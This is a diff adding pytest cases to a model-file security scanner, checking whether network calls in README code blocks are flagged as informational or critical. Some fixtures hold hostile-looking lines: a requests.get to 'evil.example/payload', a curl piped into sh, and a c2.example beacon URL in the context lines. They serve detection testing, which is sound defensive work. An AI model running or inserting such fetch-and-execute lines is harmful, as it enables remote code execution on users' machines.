@@ -266,6 +266,152 @@ beacon_url: https://c2.example/payload
     assert determine_exit_code(aggregate) == 0
 
 
+def test_text_scanner_fenced_documentation_loopback_api_request_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+curl http://localhost:8080/v1/embeddings \\
+  -H "Content-Type: application/json" \\
+  -d '{"input": "This is an example sentence"}'
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_loopback_api_client_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import urllib.request
+
+req = urllib.request.Request("http://127.0.0.1:8080/v1/chat/completions")
+return urllib.request.urlopen(req).read()
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    informational_types = {
+        check.details.get("type")
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
+    }
+    assert {"network_function", "network_library", "url_detected"} <= informational_types
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_passive_media_fetch_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python3
+from PIL import Image
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+image = Image.open(requests.get(url, stream=True).raw)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    informational_types = {
+        check.details.get("type")
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
+    }
+    assert {"network_function", "network_library", "url_detected"} <= informational_types
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_active_call(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python3
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+requests.get(url, stream=True)
+requests.get("https://evil.example/payload")
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_executable_loopback_api_request_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "client.py"
+    text_path.write_text('requests.get("http://localhost:8080/v1/embeddings")\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_fenced_documentation_loopback_api_shell_execution_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+curl http://localhost:8080/v1/embeddings \\
+  | sh
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_network_function_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
